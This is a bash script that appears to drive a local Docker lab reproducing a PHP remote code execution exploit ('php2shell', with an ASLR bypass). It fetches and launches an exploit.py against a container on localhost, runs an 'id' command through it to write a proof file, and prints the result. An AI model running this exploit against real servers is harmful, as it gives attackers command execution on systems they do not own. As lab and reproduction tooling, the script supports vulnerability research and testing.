#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"

PORT="${PORT:-18088}"
POC_DIR="${POC_DIR:-$ROOT/.poc/php2shell-bypass-aslr-exp}"
PROOF="$ROOT/out/pwned"

"$ROOT/scripts/preflight.sh"
"$ROOT/scripts/fetch-poc.sh"

rm -f "$PROOF" 2>/dev/null || true

echo
echo "[*] target says: $(python3 - "$PORT" <<'PY'
import sys, urllib.request
print(urllib.request.urlopen(f"http://127.0.0.1:{sys.argv[1]}/", timeout=5).read().decode().strip())
PY
)"
echo "[*] running the PoC (workers=1 because this lab uses one prefork child)"
echo

set +e
python3 "$POC_DIR/exploit.py" \
  --port "$PORT" \
  --workers 1 \
  --retries 5 \
  --proof "$PROOF" \
  --cmd 'id > /out/pwned; echo "hello from php2shell" >> /out/pwned'
rc=$?
set -e

# The host proof file is the primary check. If the bind mount behaves
# differently on the user's platform, read the same file from the container.
if [ ! -s "$PROOF" ] && docker compose exec -T vuln test -s /out/pwned; then
  docker compose exec -T vuln cat /out/pwned > "$PROOF"
  echo "[*] host proof was not visible; copied it from the container instead"
fi

if [ ! -s "$PROOF" ]; then
  echo
  echo "[-] no proof produced (PoC exit code $rc)" >&2
  echo "[-] check the logs: docker compose logs vuln" >&2
  echo "[-] check the platform: uname -m (this PoC is calibrated for amd64)" >&2
  echo "[-] check the config: ./scripts/preflight.sh" >&2
  exit 1
fi

echo
echo "================ PROOF ================"
cat "$PROOF"
echo "======================================="
echo
echo "[*] stop the lab with: docker compose --profile patched down -v"
